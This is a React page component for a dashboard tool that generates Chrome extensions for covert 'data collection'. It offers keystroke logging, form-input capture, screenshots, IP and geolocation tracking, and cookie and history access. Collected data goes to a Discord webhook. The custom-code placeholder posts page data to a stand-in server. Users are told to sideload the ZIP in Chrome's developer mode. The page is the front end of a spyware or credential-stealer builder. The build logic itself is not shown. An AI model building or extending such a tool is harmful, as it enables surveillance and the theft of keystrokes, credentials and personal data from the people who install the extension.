
import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { 
  Download, 
  Puzzle, 
  Code, 
  Settings,
  Shield,
  Globe,
  Monitor,
  Camera,
  FileText,
  Zap,
  CheckCircle
} from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { useAuth } from '@/contexts/AuthContext';
import SnowEffect from '@/components/ui/snow-effect';
import Sidebar from '@/components/dashboard/sidebar';

interface ExtensionConfig {
  name: string;
  description: string;
  version: string;
  permissions: string[];
  features: string[];
  webhookUrl: string;
  customCode: string;
}

export default function ExtensionGenerator() {
  const [config, setConfig] = useState<ExtensionConfig>({
    name: 'Custom IP Logger',
    description: 'Track visitor information and activity',
    version: '1.0.0',
    permissions: ['activeTab', 'storage', 'tabs'],
    features: ['ip_tracking', 'geolocation', 'browser_info'],
    webhookUrl: '',
    customCode: ''
  });
  const [isGenerating, setIsGenerating] = useState(false);
  const { toast } = useToast();
  const { user } = useAuth();

  const availablePermissions = [
    { id: 'activeTab', label: 'Active Tab', description: 'Access current tab information' },
    { id: 'storage', label: 'Storage', description: 'Store data locally' },
    { id: 'tabs', label: 'Tabs', description: 'Access all tabs' },
    { id: 'cookies', label: 'Cookies', description: 'Read and modify cookies' },
    { id: 'history', label: 'History', description: 'Access browsing history' },
    { id: 'bookmarks', label: 'Bookmarks', description: 'Access bookmarks' },
    { id: 'webRequest', label: 'Web Requests', description: 'Monitor network requests' },
    { id: 'geolocation', label: 'Geolocation', description: 'Access location data' },
    { id: 'notifications', label: 'Notifications', description: 'Show desktop notifications' }
  ];

  const availableFeatures = [
    { id: 'ip_tracking', label: 'IP Tracking', description: 'Log IP addresses', icon: Globe },
    { id: 'geolocation', label: 'Geolocation', description: 'Get location data', icon: Monitor },
    { id: 'browser_info', label: 'Browser Info', description: 'Collect browser details', icon: Settings },
    { id: 'screenshot', label: 'Screenshots', description: 'Capture page screenshots', icon: Camera },
    { id: 'form_data', label: 'Form Data', description: 'Track form inputs', icon: FileText },
    { id: 'click_tracking', label: 'Click Tracking', description: 'Monitor user clicks', icon: Zap },
    { id: 'keylogger', label: 'Keystroke Logging', description: 'Log keyboard activity', icon: Shield }
  ];

  const togglePermission = (permission: string) => {
    setConfig(prev => ({
      ...prev,
      permissions: prev.permissions.includes(permission)
        ? prev.permissions.filter(p => p !== permission)
        : [...prev.permissions, permission]
    }));
  };

  const toggleFeature = (feature: string) => {
    setConfig(prev => ({
      ...prev,
      features: prev.features.includes(feature)
        ? prev.features.filter(f => f !== feature)
        : [...prev.features, feature]
    }));
  };

  const generateExtension = async () => {
    if (!config.name.trim()) {
      toast({
        title: "Name Required",
        description: "Please enter an extension name",
        variant: "destructive"
      });
      return;
    }

    setIsGenerating(true);

    try {
      const response = await fetch('/api/generate-extension', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        },
        body: JSON.stringify(config)
      });

      if (!response.ok) {
        throw new Error('Failed to generate extension');
      }

      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `${config.name.replace(/\s+/g, '_').toLowerCase()}_extension.zip`;
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);

      toast({
        title: "Extension Generated",
        description: "Your Chrome extension has been downloaded successfully!",
      });
    } catch (error) {
      toast({
        title: "Generation Failed",
        description: "Failed to generate extension. Please try again.",
        variant: "destructive"
      });
    } finally {
      setIsGenerating(false);
    }
  };

  return (
    <div className="flex h-screen bg-background relative overflow-hidden">
      <SnowEffect color="#ffffff" glow={true} density={60} speed={1.2} />
      <Sidebar />

      <main className="flex-1 overflow-auto relative z-10">
        <header className="bg-card/80 backdrop-blur-md border-b border-border px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="animate-slide-in-up">
              <h2 className="text-2xl font-semibold text-foreground drop-shadow-lg">Extension Generator</h2>
              <p className="text-muted-foreground">Create custom Chrome extensions for data collection</p>
            </div>
            <Badge className="bg-purple-500/20 text-purple-300 border-purple-500/30">
              <Puzzle className="w-4 h-4 mr-1" />
              Chrome Extension
            </Badge>
          </div>
        </header>

        <div className="p-6 space-y-6">
          {/* Basic Configuration */}
          <Card className="bg-black/40 backdrop-blur-md border-white/10 shadow-2xl animate-slide-in-up">
            <CardHeader>
              <CardTitle className="text-white flex items-center gap-2">
                <Settings className="h-5 w-5 text-blue-400" />
                Basic Configuration
              </CardTitle>
              <CardDescription className="text-gray-300">
                Configure the basic settings for your Chrome extension
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="name" className="text-gray-300">Extension Name</Label>
                  <Input
                    id="name"
                    value={config.name}
                    onChange={(e) => setConfig(prev => ({ ...prev, name: e.target.value }))}
                    className="bg-white/5 border-white/20 text-white"
                    placeholder="My Custom Logger"
                  />
                </div>
                <div>
                  <Label htmlFor="version" className="text-gray-300">Version</Label>
                  <Input
                    id="version"
                    value={config.version}
                    onChange={(e) => setConfig(prev => ({ ...prev, version: e.target.value }))}
                    className="bg-white/5 border-white/20 text-white"
                    placeholder="1.0.0"
                  />
                </div>
              </div>
              <div>
                <Label htmlFor="description" className="text-gray-300">Description</Label>
                <Textarea
                  id="description"
                  value={config.description}
                  onChange={(e) => setConfig(prev => ({ ...prev, description: e.target.value }))}
                  className="bg-white/5 border-white/20 text-white"
                  placeholder="Describe what your extension does..."
                  rows={3}
                />
              </div>
              <div>
                <Label htmlFor="webhook" className="text-gray-300">Webhook URL (Optional)</Label>
                <Input
                  id="webhook"
                  value={config.webhookUrl}
                  onChange={(e) => setConfig(prev => ({ ...prev, webhookUrl: e.target.value }))}
                  className="bg-white/5 border-white/20 text-white"
                  placeholder="https://discord.com/api/webhooks/..."
                />
              </div>
            </CardContent>
          </Card>

          {/* Permissions */}
          <Card className="bg-black/40 backdrop-blur-md border-white/10 shadow-2xl animate-slide-in-left">
            <CardHeader>
              <CardTitle className="text-white flex items-center gap-2">
                <Shield className="h-5 w-5 text-green-400" />
                Permissions
              </CardTitle>
              <CardDescription className="text-gray-300">
                Select the permissions your extension needs
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                {availablePermissions.map((permission) => (
                  <div
                    key={permission.id}
                    onClick={() => togglePermission(permission.id)}
                    className={`p-3 rounded-lg border cursor-pointer transition-all ${
                      config.permissions.includes(permission.id)
                        ? 'bg-blue-500/20 border-blue-500/50 text-blue-300'
                        : 'bg-white/5 border-white/20 text-gray-300 hover:bg-white/10'
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <span className="font-medium">{permission.label}</span>
                      {config.permissions.includes(permission.id) && (
                        <CheckCircle className="h-4 w-4 text-blue-400" />
                      )}
                    </div>
                    <p className="text-xs opacity-75 mt-1">{permission.description}</p>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>

          {/* Features */}
          <Card className="bg-black/40 backdrop-blur-md border-white/10 shadow-2xl animate-slide-in-right">
            <CardHeader>
              <CardTitle className="text-white flex items-center gap-2">
                <Code className="h-5 w-5 text-purple-400" />
                Data Collection Features
              </CardTitle>
              <CardDescription className="text-gray-300">
                Choose what information your extension will collect
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                {availableFeatures.map((feature) => {
                  const Icon = feature.icon;
                  return (
                    <div
                      key={feature.id}
                      onClick={() => toggleFeature(feature.id)}
                      className={`p-4 rounded-lg border cursor-pointer transition-all ${
                        config.features.includes(feature.id)
                          ? 'bg-purple-500/20 border-purple-500/50 text-purple-300'
                          : 'bg-white/5 border-white/20 text-gray-300 hover:bg-white/10'
                      }`}
                    >
                      <div className="flex items-center gap-3">
                        <Icon className="h-5 w-5" />
                        <div className="flex-1">
                          <div className="flex items-center justify-between">
                            <span className="font-medium">{feature.label}</span>
                            {config.features.includes(feature.id) && (
                              <CheckCircle className="h-4 w-4 text-purple-400" />
                            )}
                          </div>
                          <p className="text-xs opacity-75 mt-1">{feature.description}</p>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            </CardContent>
          </Card>

          {/* Custom Code */}
          <Card className="bg-black/40 backdrop-blur-md border-white/10 shadow-2xl animate-slide-in-up">
            <CardHeader>
              <CardTitle className="text-white flex items-center gap-2">
                <Code className="h-5 w-5 text-yellow-400" />
                Custom JavaScript Code
              </CardTitle>
              <CardDescription className="text-gray-300">
                Add custom JavaScript code to execute in your extension (optional)
              </CardDescription>
            </CardHeader>
            <CardContent>
              <Textarea
                value={config.customCode}
                onChange={(e) => setConfig(prev => ({ ...prev, customCode: e.target.value }))}
                className="bg-white/5 border-white/20 text-white font-mono text-sm"
                placeholder="// Add your custom JavaScript code here
console.log('Extension loaded!');

// Example: Send custom data
function sendCustomData() {
  const data = {
    url: window.location.href,
    timestamp: Date.now(),
    customField: 'your-value'
  };
  
  // Send to your server
  fetch('https://your-server.com/api/track', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
}"
                rows={12}
              />
            </CardContent>
          </Card>

          {/* Generate Button */}
          <Card className="bg-black/40 backdrop-blur-md border-white/10 shadow-2xl animate-slide-in-up">
            <CardContent className="pt-6">
              <div className="flex flex-col sm:flex-row items-center justify-between gap-4">
                <div>
                  <h3 className="text-white font-semibold">Ready to Generate</h3>
                  <p className="text-gray-400 text-sm">
                    Your extension will be packaged as a ZIP file ready for Chrome installation
                  </p>
                </div>
                <Button
                  onClick={generateExtension}
                  disabled={isGenerating || !config.name.trim()}
                  className="bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white"
                  size="lg"
                >
                  {isGenerating ? (
                    <>
                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                      Generating...
                    </>
                  ) : (
                    <>
                      <Download className="mr-2 h-4 w-4" />
                      Generate Extension
                    </>
                  )}
                </Button>
              </div>

              <Alert className="mt-4 bg-blue-900/50 border-blue-500/50">
                <Puzzle className="h-4 w-4 text-blue-400" />
                <AlertDescription className="text-blue-200">
                  <strong>Installation Instructions:</strong> Once downloaded, extract the ZIP file, 
                  open Chrome's Extension Manager (chrome://extensions/), enable Developer Mode, 
                  and click "Load unpacked" to select the extracted folder.
                </AlertDescription>
              </Alert>
            </CardContent>
          </Card>
        </div>
      </main>
    </div>
  );
}
